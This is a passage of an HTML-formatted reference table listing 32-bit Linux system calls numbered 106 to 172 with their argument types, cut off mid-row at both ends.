style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">106.</font> | <font style=\"color:#4f4f4f;\">stat</font> | <font style=\"color:#4f4f4f;\">106.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct __old_kernel_stat *statbuf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">107.</font> | <font style=\"color:#4f4f4f;\">lstat</font> | <font style=\"color:#4f4f4f;\">107.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct __old_kernel_stat *statbuf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">108.</font> | <font style=\"color:#4f4f4f;\">fstat</font> | <font style=\"color:#4f4f4f;\">108.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">struct __old_kernel_stat *statbuf</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">109.</font> | <font style=\"color:#4f4f4f;\">olduname</font> | <font style=\"color:#4f4f4f;\">109.</font> | <font style=\"color:#4f4f4f;\">struct oldold_utsname *</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">110.</font> | <font style=\"color:#4f4f4f;\">iopl</font> | <font style=\"color:#4f4f4f;\">110.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">111.</font> | <font style=\"color:#4f4f4f;\">vhangup</font> | <font style=\"color:#4f4f4f;\">111.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">112.</font> | <font style=\"color:#4f4f4f;\">idle</font> | <font style=\"color:#4f4f4f;\">112.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">113.</font> | <font style=\"color:#4f4f4f;\">vm86old</font> | <font style=\"color:#4f4f4f;\">113.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">114.</font> | <font style=\"color:#4f4f4f;\">wait4</font> | <font style=\"color:#4f4f4f;\">114.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int *stat_addr</font> | <font style=\"color:#4f4f4f;\">int options</font> | <font style=\"color:#4f4f4f;\">struct rusage *ru</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">115.</font> | <font style=\"color:#4f4f4f;\">swapoff</font> | <font style=\"color:#4f4f4f;\">115.</font> | <font style=\"color:#4f4f4f;\">const char *specialfile</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">116.</font> | <font style=\"color:#4f4f4f;\">sysinfo</font> | <font style=\"color:#4f4f4f;\">116.</font> | <font style=\"color:#4f4f4f;\">struct sysinfo *info</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">117.</font> | <font style=\"color:#4f4f4f;\">ipc</font> | <font style=\"color:#4f4f4f;\">117.</font> | <font style=\"color:#4f4f4f;\">unsigned int call</font> | <font style=\"color:#4f4f4f;\">int first</font> | <font style=\"color:#4f4f4f;\">unsigned long second</font> | <font style=\"color:#4f4f4f;\">unsigned long third</font> | <font style=\"color:#4f4f4f;\">void *ptr</font> | <font style=\"color:#4f4f4f;\">long fifth</font> |\n| <font style=\"color:#4f4f4f;\">118.</font> | <font style=\"color:#4f4f4f;\">fsync</font> | <font style=\"color:#4f4f4f;\">118.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">119.</font> | <font style=\"color:#4f4f4f;\">sigreturn</font> | <font style=\"color:#4f4f4f;\">119.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">120.</font> | <font style=\"color:#4f4f4f;\">clone</font> | <font style=\"color:#4f4f4f;\">120.</font> | <font style=\"color:#4f4f4f;\">unsigned long</font> | <font style=\"color:#4f4f4f;\">unsigned long</font> | <font style=\"color:#4f4f4f;\">int *</font> | <font style=\"color:#4f4f4f;\">int *</font> | <font style=\"color:#4f4f4f;\">unsigned long</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">121.</font> | <font style=\"color:#4f4f4f;\">setdomainname</font> | <font style=\"color:#4f4f4f;\">121.</font> | <font style=\"color:#4f4f4f;\">char *name</font> | <font style=\"color:#4f4f4f;\">int len</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">122.</font> | <font style=\"color:#4f4f4f;\">uname</font> | <font style=\"color:#4f4f4f;\">122.</font> | <font style=\"color:#4f4f4f;\">struct old_utsname *</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">123.</font> | <font style=\"color:#4f4f4f;\">modify_ldt</font> | <font style=\"color:#4f4f4f;\">123.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">124.</font> | <font style=\"color:#4f4f4f;\">adjtimex</font> | <font style=\"color:#4f4f4f;\">124.</font> | <font style=\"color:#4f4f4f;\">struct timex *txc_p</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">125.</font> | <font style=\"color:#4f4f4f;\">mprotect</font> | <font style=\"color:#4f4f4f;\">125.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned long prot</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">126.</font> | <font style=\"color:#4f4f4f;\">sigprocmask</font> | <font style=\"color:#4f4f4f;\">126.</font> | <font style=\"color:#4f4f4f;\">int how</font> | <font style=\"color:#4f4f4f;\">old_sigset_t *set</font> | <font style=\"color:#4f4f4f;\">old_sigset_t *oset</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">127.</font> | <font style=\"color:#4f4f4f;\">create_module</font> | <font style=\"color:#4f4f4f;\">127.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">128.</font> | <font style=\"color:#4f4f4f;\">init_module</font> | <font style=\"color:#4f4f4f;\">128.</font> | <font style=\"color:#4f4f4f;\">void *umod</font> | <font style=\"color:#4f4f4f;\">unsigned long len</font> | <font style=\"color:#4f4f4f;\">const char *uargs</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">129.</font> | <font style=\"color:#4f4f4f;\">delete_module</font> | <font style=\"color:#4f4f4f;\">129.</font> | <font style=\"color:#4f4f4f;\">const char *name_user</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">130.</font> | <font style=\"color:#4f4f4f;\">get_kernel_syms</font> | <font style=\"color:#4f4f4f;\">130.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">131.</font> | <font style=\"color:#4f4f4f;\">quotactl</font> | <font style=\"color:#4f4f4f;\">131.</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">const char *special</font> | <font style=\"color:#4f4f4f;\">qid_t id</font> | <font style=\"color:#4f4f4f;\">void *addr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">132.</font> | <font style=\"color:#4f4f4f;\">getpgid</font> | <font style=\"color:#4f4f4f;\">132.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">133.</font> | <font style=\"color:#4f4f4f;\">fchdir</font> | <font style=\"color:#4f4f4f;\">133.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">134.</font> | <font style=\"color:#4f4f4f;\">bdflush</font> | <font style=\"color:#4f4f4f;\">134.</font> | <font style=\"color:#4f4f4f;\">int func</font> | <font style=\"color:#4f4f4f;\">long data</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">135.</font> | <font style=\"color:#4f4f4f;\">sysfs</font> | <font style=\"color:#4f4f4f;\">135.</font> | <font style=\"color:#4f4f4f;\">int option</font> | <font style=\"color:#4f4f4f;\">unsigned long arg1</font> | <font style=\"color:#4f4f4f;\">unsigned long arg2</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">136.</font> | <font style=\"color:#4f4f4f;\">personality</font> | <font style=\"color:#4f4f4f;\">136.</font> | <font style=\"color:#4f4f4f;\">unsigned int personality</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">137.</font> | <font style=\"color:#4f4f4f;\">afs_syscall</font> | <font style=\"color:#4f4f4f;\">137.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">138.</font> | <font style=\"color:#4f4f4f;\">setfsuid</font> | <font style=\"color:#4f4f4f;\">138.</font> | <font style=\"color:#4f4f4f;\">uid_t uid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">139.</font> | <font style=\"color:#4f4f4f;\">setfsgid</font> | <font style=\"color:#4f4f4f;\">139.</font> | <font style=\"color:#4f4f4f;\">gid_t gid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">140.</font> | <font style=\"color:#4f4f4f;\">_llseek</font> | <font style=\"color:#4f4f4f;\">140.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">141.</font> | <font style=\"color:#4f4f4f;\">getdents</font> | <font style=\"color:#4f4f4f;\">141.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">struct linux_dirent *dirent</font> | <font style=\"color:#4f4f4f;\">unsigned int count</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">142.</font> | <font style=\"color:#4f4f4f;\">_newselect</font> | <font style=\"color:#4f4f4f;\">142.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">143.</font> | <font style=\"color:#4f4f4f;\">flock</font> | <font style=\"color:#4f4f4f;\">143.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">144.</font> | <font style=\"color:#4f4f4f;\">msync</font> | <font style=\"color:#4f4f4f;\">144.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">145.</font> | <font style=\"color:#4f4f4f;\">readv</font> | <font style=\"color:#4f4f4f;\">145.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">146.</font> | <font style=\"color:#4f4f4f;\">writev</font> | <font style=\"color:#4f4f4f;\">146.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">147.</font> | <font style=\"color:#4f4f4f;\">getsid</font> | <font style=\"color:#4f4f4f;\">147.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">148.</font> | <font style=\"color:#4f4f4f;\">fdatasync</font> | <font style=\"color:#4f4f4f;\">148.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">149.</font> | <font style=\"color:#4f4f4f;\">_sysctl</font> | <font style=\"color:#4f4f4f;\">149.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">150.</font> | <font style=\"color:#4f4f4f;\">mlock</font> | <font style=\"color:#4f4f4f;\">150.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">151.</font> | <font style=\"color:#4f4f4f;\">munlock</font> | <font style=\"color:#4f4f4f;\">151.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">152.</font> | <font style=\"color:#4f4f4f;\">mlockall</font> | <font style=\"color:#4f4f4f;\">152.</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">153.</font> | <font style=\"color:#4f4f4f;\">munlockall</font> | <font style=\"color:#4f4f4f;\">153.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">154.</font> | <font style=\"color:#4f4f4f;\">sched_setparam</font> | <font style=\"color:#4f4f4f;\">154.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">struct sched_param *param</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">155.</font> | <font style=\"color:#4f4f4f;\">sched_getparam</font> | <font style=\"color:#4f4f4f;\">155.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">struct sched_param *param</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">156.</font> | <font style=\"color:#4f4f4f;\">sched_setscheduler</font> | <font style=\"color:#4f4f4f;\">156.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int policy</font> | <font style=\"color:#4f4f4f;\">struct sched_param *param</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">157.</font> | <font style=\"color:#4f4f4f;\">sched_getscheduler</font> | <font style=\"color:#4f4f4f;\">157.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">158.</font> | <font style=\"color:#4f4f4f;\">sched_yield</font> | <font style=\"color:#4f4f4f;\">158.</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">159.</font> | <font style=\"color:#4f4f4f;\">sched_get_priority_max</font> | <font style=\"color:#4f4f4f;\">159.</font> | <font style=\"color:#4f4f4f;\">int policy</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">160.</font> | <font style=\"color:#4f4f4f;\">sched_get_priority_min</font> | <font style=\"color:#4f4f4f;\">160.</font> | <font style=\"color:#4f4f4f;\">int policy</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">161.</font> | <font style=\"color:#4f4f4f;\">sched_rr_get_interval</font> | <font style=\"color:#4f4f4f;\">161.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">struct timespec *interval</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">162.</font> | <font style=\"color:#4f4f4f;\">nanosleep</font> | <font style=\"color:#4f4f4f;\">162.</font> | <font style=\"color:#4f4f4f;\">struct __kernel_timespec *rqtp</font> | <font style=\"color:#4f4f4f;\">struct __kernel_timespec *rmtp</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">163.</font> | <font style=\"color:#4f4f4f;\">mremap</font> | <font style=\"color:#4f4f4f;\">163.</font> | <font style=\"color:#4f4f4f;\">unsigned long addr</font> | <font style=\"color:#4f4f4f;\">unsigned long old_len</font> | <font style=\"color:#4f4f4f;\">unsigned long new_len</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">unsigned long new_addr</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">164.</font> | <font style=\"color:#4f4f4f;\">setresuid</font> | <font style=\"color:#4f4f4f;\">164.</font> | <font style=\"color:#4f4f4f;\">uid_t ruid</font> | <font style=\"color:#4f4f4f;\">uid_t euid</font> | <font style=\"color:#4f4f4f;\">uid_t suid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">165.</font> | <font style=\"color:#4f4f4f;\">getresuid</font> | <font style=\"color:#4f4f4f;\">165.</font> | <font style=\"color:#4f4f4f;\">uid_t *ruid</font> | <font style=\"color:#4f4f4f;\">uid_t *euid</font> | <font style=\"color:#4f4f4f;\">uid_t *suid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">166.</font> | <font style=\"color:#4f4f4f;\">vm86</font> | <font style=\"color:#4f4f4f;\">166.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">167.</font> | <font style=\"color:#4f4f4f;\">query_module</font> | <font style=\"color:#4f4f4f;\">167.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">168.</font> | <font style=\"color:#4f4f4f;\">poll</font> | <font style=\"color:#4f4f4f;\">168.</font> | <font style=\"color:#4f4f4f;\">struct pollfd *ufds</font> | <font style=\"color:#4f4f4f;\">unsigned int nfds</font> | <font style=\"color:#4f4f4f;\">int timeout</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">169.</font> | <font style=\"color:#4f4f4f;\">nfsservctl</font> | <font style=\"color:#4f4f4f;\">169.</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> | <font style=\"color:#4f4f4f;\">?</font> |\n| <font style=\"color:#4f4f4f;\">170.</font> | <font style=\"color:#4f4f4f;\">setresgid</font> | <font style=\"color:#4f4f4f;\">170.</font> | <font style=\"color:#4f4f4f;\">gid_t rgid</font> | <font style=\"color:#4f4f4f;\">gid_t egid</font> | <font style=\"color:#4f4f4f;\">gid_t sgid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">171.</font> | <font style=\"color:#4f4f4f;\">getresgid</font> | <font style=\"color:#4f4f4f;\">171.</font> | <font style=\"color:#4f4f4f;\">gid_t *rgid</font> | <font style=\"color:#4f4f4f;\">gid_t *egid</font> | <font style=\"color:#4f4f4f;\">gid_t *sgid</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">172.</font> | <font style=\"color:#4f4f4f;\">prctl</font> | <font style=\"color:#4f4f4f;\">172.</font> | <font style=\"color:#4f4f4f;\">int 